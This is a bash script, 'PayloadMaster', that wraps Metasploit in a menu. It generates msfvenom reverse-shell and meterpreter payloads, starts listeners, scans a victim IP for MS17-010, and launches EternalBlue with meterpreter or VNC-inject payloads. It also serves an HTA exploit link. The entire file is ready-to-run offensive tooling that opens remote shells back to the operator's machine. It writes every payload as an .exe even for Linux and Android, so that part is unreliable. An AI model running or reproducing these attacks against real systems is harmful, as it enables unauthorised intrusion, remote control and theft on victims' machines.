#!/bin/bash

resize -s 27 80
clear

# Determine the local IP address for Linux and macOS
if [ "$(uname)" == "Darwin" ]; then
  ip=$(ipconfig getifaddr en0) # Use 'en0' or 'en1' depending on your active network interface on macOS.
else
  ip=$(hostname -I | cut -d' ' -f1) # For Linux
fi

# Function to create a Metasploit payload and listener
function create_payload {
  echo "Select the platform:"
  echo "  (1) Windows"
  echo "  (2) Linux"
  echo "  (3) Android"
  read -p "Platform: " platform

  case $platform in
    1)
      platform_name="windows"
      ;;
    2)
      platform_name="linux"
      ;;
    3)
      platform_name="android"
      ;;
    *)
      echo "Invalid platform selection."
      return
      ;;
  esac

  case $platform_name in
    "windows")
      echo "Select the payload type for Windows:"
      echo "  (1) meterpreter/reverse_tcp"
      echo "  (2) shell_reverse_tcp"
      read -p "Payload type: " payload_type

      case $payload_type in
        1)
          payload_type="meterpreter/reverse_tcp"
          ;;
        2)
          payload_type="shell_reverse_tcp"
          ;;
        *)
          echo "Invalid payload type selection for Windows."
          return
          ;;
      esac
      ;;
    "linux")
      echo "Select the payload type for Linux:"
      echo "  (1) meterpreter/reverse_tcp"
      echo "  (2) shell_reverse_tcp"
      read -p "Payload type: " payload_type

      case $payload_type in
        1)
          payload_type="meterpreter/reverse_tcp"
          ;;
        2)
          payload_type="shell_reverse_tcp"
          ;;
        *)
          echo "Invalid payload type selection for Linux."
          return
          ;;
      esac
      ;;
    "android")
      echo "Select the payload type for Android:"
      echo "  (1) meterpreter/reverse_tcp"
      echo "  (2) shell_reverse_tcp"
      read -p "Payload type: " payload_type

      case $payload_type in
        1)
          payload_type="meterpreter/reverse_tcp"
          ;;
        2)
          payload_type="shell_reverse_tcp"
          ;;
        *)
          echo "Invalid payload type selection for Android."
          return
          ;;
      esac
      ;;
  esac

  read -p "Enter the name of the payload (without extension): " payload_name
  read -p "Enter the payload LHOST [$ip]: " lhost_payload
  lhost_payload=${lhost_payload:-$ip}
  read -p "Enter the payload LPORT [4444]: " lport_payload
  lport_payload=${lport_payload:-4444}

  msfvenom -p $platform_name/$payload_type LHOST=$lhost_payload LPORT=$lport_payload -f exe > "$payload_name.exe"

  read -p "Use the same LHOST and LPORT for the listener? [Y/n]: " same_host_port
  if [[ $same_host_port =~ ^[Yy]$ ]] || [[ -z $same_host_port ]]; then
    lhost_listener=$lhost_payload
    lport_listener=$lport_payload
  else
    read -p "Enter the listener LHOST: " lhost_listener
    read -p "Enter the listener LPORT: " lport_listener
  fi

  msfconsole -q -x "use exploit/multi/handler; set payload $platform_name/$payload_type; set LHOST $lhost_listener; set LPORT $lport_listener; exploit;"
}

# Function to scan if a target is vulnerable to MS17-010
function scan_vulnerable {
  echo "Victim's IP:"
  read r
  msfconsole -q -x "use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS $r; exploit; exit;"
}

# Function to exploit Windows with MS17-010 (EternalBlue)
function exploit_windows {
  echo "Victim's IP:"
  read r
  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $ip; set RHOST $r; exploit;"
}

# Function to enable Remote Desktop on a Windows target using MS17-010 (EternalBlue)
function enable_remote_desktop {
  echo "Victim's IP:"
  read r
  msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp; set LHOST $ip; set RHOST $r; set viewonly false; exploit;"
}

# Function to exploit Windows with a link (HTA Server)
function exploit_windows_hta {
  echo "Uripath: (/)"
  read u
  msfconsole -q -x "use exploit/windows/misc/hta_server; set SRVHOST $ip; set URIPATH /$u; set payload windows/meterpreter/reverse_tcp; set LHOST $ip; exploit;"
}

while true; do
  clear

  echo "==========================="
  echo "        PayloadMaster       "
  echo "==========================="
  echo "Select an option:"
  echo "  (1) Create Payload and Listener"
  echo "  (2) Scan if a target is vulnerable to MS17-010"
  echo "  (3) Exploit Windows with MS17-010 (EternalBlue)"
  echo "  (4) Enable Remote Desktop on a Windows target using MS17-010"
  echo "  (5) Exploit Windows with a link (HTA Server)"
  echo "  (q) Quit"
  read -p "Choice: " x

  case $x in
    1)
      create_payload
      ;;
    2)
      scan_vulnerable
      ;;
    3)
      exploit_windows
      ;;
    4)
      enable_remote_desktop
      ;;
    5)
      exploit_windows_hta
      ;;
    q)
      echo "Quitting..."
      exit 0
      ;;
    *)
      echo "Invalid option. Please try again."
      ;;
  esac
done
